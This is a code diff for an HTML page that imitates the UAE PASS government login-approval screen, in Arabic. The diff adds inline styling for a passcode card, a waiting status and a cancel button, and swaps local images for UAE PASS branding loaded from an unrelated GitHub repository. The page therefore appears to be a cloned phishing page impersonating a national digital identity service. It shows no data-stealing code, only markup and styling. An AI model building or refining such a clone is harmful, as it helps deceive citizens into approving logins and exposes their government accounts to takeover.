@@ -4,14 +4,12 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="shortcut icon" type="image/ico" href="uaepass/images/favicon.ico">
+    <link rel="shortcut icon" type="image/x-icon" href="https://raw.githubusercontent.com/invamsa-ai/saudi/main/favicon.ico">
     
-    <!-- Combined CSS files -->
-    <link rel="stylesheet" type="text/css" href="uaepass/css/bootstrap.min.css">
-    <link rel="stylesheet" type="text/css" href="uaepass/css/polling-style.css?5">
-    <link rel="stylesheet" type="text/css" href="uaepass/css/dubai-font.css">
+    <!-- Bootstrap CSS من CDN -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     
-    <!-- Optimized JavaScript loading -->
+    <!-- jQuery -->
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     
     <title>UAE PASS - الموافقة على طلب تسجيل الدخول</title>
@@ -25,12 +23,272 @@
             padding: 0;
         }
         
+        /* CSS الأساسي */
+        .flex {
+            display: flex;
+        }
+
+        .login-container {
+            max-width: 1280px;
+            margin: auto;
+            flex: 0 0 100%;
+        }
+
+        .login-container-fluid {
+            max-width: 100%;
+        }
+
+        .header {
+            background: #fff;
+            height: 64px;
+            padding: 16px 0px;
+        }
+
+        .header-title {
+            color: #1B1B1F;
+            font-style: normal;
+            font-weight: 300;
+            line-height: 32px;
+            font-size: 22px;
+            padding: 0px 16px;
+        }
+
+        .card {
+            margin: 48px 0px 10px 0px;
+        }
+
+        .card-info {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            min-width: 0;
+            word-wrap: break-word;
+            background-clip: border-box;
+            border-radius: 0.25rem;
+            margin: 48px 0px 10px 0px;
+            border: 0px !important;
+        }
+
+        .card.login {
+            padding: 48px;
+            margin: 48px 0px 10px 0px;
+            border: 1.6px solid transparent;
+            border-radius: 19px;
+            background-image: linear-gradient(to right bottom, white, white), radial-gradient(circle at top left, #ACE4AC, #fff, #fff 100%);
+            background-origin: border-box;
+            background-clip: padding-box, border-box;
+        }
+
+        .card.login .card-header {
+            display: flex;
+            justify-content: space-between;
+            background: white;
+            border: 0;
+            padding: 0px;
+        }
+
+        .card.login .card-content {
+            display: flex;
+            flex-direction: row;
+            flex-grow: 1;
+            justify-content: space-between;
+        }
+
+        .card.login .card-content .card-content-left {
+            max-width: 70%;
+            padding-right: 40px;
+        }
+
+        .login-pin-image {
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .info-title {
+            font-size: 18px;
+            font-style: normal;
+            font-weight: 500;
+        }
+
+        .info-app-name {
+            font-size: 16px;
+            font-style: normal;
+            font-weight: 400;
+            padding: 32px 0px;
+        }
+
+        .info-description {
+            font-size: 28px;
+            font-style: normal;
+            font-weight: 400;
+            line-height: 36px;
+            max-width: 500px;
+        }
+
+        @keyframes spin {
+            from {transform: translate(-50%, -50%) rotate(0);}
+            to   {transform: translate(-50%, -50%) rotate(360deg);}
+        }
+
+        .passcode-card {
+            color: #454F63;
+            width: 90px;
+            height: 90px;
+            margin: auto;
+            position: relative;
+            overflow: hidden;
+            border-radius: 16px;
+            display: inline-block;
+        }
+
+        .passcode-card::before {
+            content: '';
+            display: block;
+            background: conic-gradient(
+                #fff 0.0turn 0.125turn,
+                #fff 0.125turn 0.25turn,
+                #fff 0.25turn 0.375turn,
+                #fff 0.375turn 0.5turn,
+                #fff 0.5turn 0.625turn,
+                #fff 0.625turn 0.75turn,
+                #20644B 0.75turn 0.875turn,
+                #20644B 0.875turn 1.0turn
+            );
+            width: calc(100% * 1.41421356237);
+            padding-bottom: calc(100% * 1.41421356237);
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            border-radius: 100%;
+            animation: spin 5s linear infinite;
+        }
+
+        .passcode-card::after {
+            content: attr(data-after-content);
+            position: absolute;
+            inset: 0.15rem;
+            background: #ECF3EC;
+            border-radius: 0.85rem;
+            font-size: 52px;
+            font-style: normal;
+            font-weight: 400;
+            text-align: center;
+            line-height: 100px;
+        }
+
+        .uaepass-logo {
+            width: 32px;
+            object-fit: contain;
+            height: 32px;
+            padding: 6px
+        }
+
+        .uaepass-text-logo {
+            display: flex;
+            height: 41px;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .timer-img {
+            width: 25px;
+            height: 20px;
+            padding: 1.667px 5.149px 2.415px 4.706px;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .waiting-confirmation {
+            color: #C78200;
+            font-family: Roboto;
+            font-size: 18px;
+            font-style: normal;
+            font-weight: 400;
+            line-height: normal;
+            padding-top: 52px;
+        }
+
+        .cancel-request {
+            color: #FF5545;
+            border: 0;
+            background: transparent;
+            font-size: 18px;
+            font-style: normal;
+            font-weight: 500;
+            line-height: 24px;
+            cursor: pointer;
+        }
+
+        .cancel-request:after {
+            display: inline-block;
+            content: "\00d7";
+            font-size: 28px;
+            padding: 10px 0px;
+            font-weight: 400;
+        }
+
+        .polling-footer {
+            position: relative;
+            width: 100%;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .poweredby {
+            font-size: 1rem;
+            font-weight: 500;
+            line-height: 1.5;
+            text-align: center;
+            color: #454f63;
+        }
+
+        .ids-logo {
+            width: 13px;
+            height: 13px;
+            object-fit: contain;
+            margin-right: 5px;
+        }
+
+        /* Responsive */
+        @media only screen and (max-width: 600px) {
+            .card-content-right-mobile {
+                display: block;
+            }
+            
+            .card-content-right {
+                display: none;
+            }
+            
+            .cancel-request-div {
+                display: none;
+            }
+            
+            .cancel-request-mobile {
+                display: block;
+                margin-top: 20px;
+            }
+            
+            .card.login {
+                padding: 20px;
+                margin: 20px 0;
+            }
+            
+            .login-pin-image {
+                max-width: 200px;
+            }
+            
+            .info-description {
+                font-size: 18px;
+                line-height: 1.5;
+            }
+        }
+        
         .row:before, .row:after {
             width: 0 !important; 
             height: 0 !important;
         }
         
-        /* Hide elements that will be shown by JS */
         .js-hidden {
             opacity: 0;
             transition: opacity 0.3s ease;
@@ -47,7 +305,7 @@
         <div class="header-section">
             <div class="login-container-fluid header">
                 <div class="login-container flex">
-<img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/uae-pass-logo.png" class="uaepass-logo">
+                    <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/uae-pass-logo.png" alt="UAE PASS Logo" class="uaepass-logo">
                     <div class="header-title">الموافقة على طلب تسجيل الدخول</div>
                 </div>
             </div>
@@ -73,7 +331,7 @@
                     <div class="card login js-hidden">
                         <div class="card-header">
                             <div>
-                                <img src="digital_id_H.svg" alt="Digital ID" class="uaepass-text-logo">
+                                <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/digital_id_H.svg" alt="Digital ID" class="uaepass-text-logo">
                             </div>
                             <div class="cancel-request-div">
                                 <button type="button" class="cancel-request" onclick="cancel()" aria-label="إلغاء الطلب">
@@ -93,7 +351,7 @@
 
                                     <!-- Mobile Image -->
                                     <div class="card-content-right-mobile">
-                                        <img src="login-pin.svg" alt="Login PIN" class="login-pin-image">
+                                        <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
                                     </div>
 
                                     <div class="info-description">
@@ -107,7 +365,7 @@
                                     
                                     <!-- Waiting Status -->
                                     <div class="waiting-confirmation">
-                                        <img src="Timer.gif" alt="Timer" class="timer-img">
+                                        <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/Timer.gif" alt="Timer" class="timer-img">
                                         في انتظار تأكيدك
                                     </div>
 
@@ -122,14 +380,14 @@
                             
                             <!-- Desktop Image -->
                             <div class="card-content-right">
-                                <img src="uaepass/images/login-pin.svg" alt="Login PIN" class="login-pin-image">
+                                <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" alt="Login PIN" class="login-pin-image">
                             </div>
                         </div>
                     </div>
                     
                     <!-- Footer -->
                     <div class="polling-footer">
-                        <img class="ids-logo" src="n6.png" alt="IDS Logo" />
+                        <img class="ids-logo" src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/n6.png" alt="IDS Logo" />
                         <p class="poweredby"> Powered by UAE PASS </p>
                     </div>
                 </form>
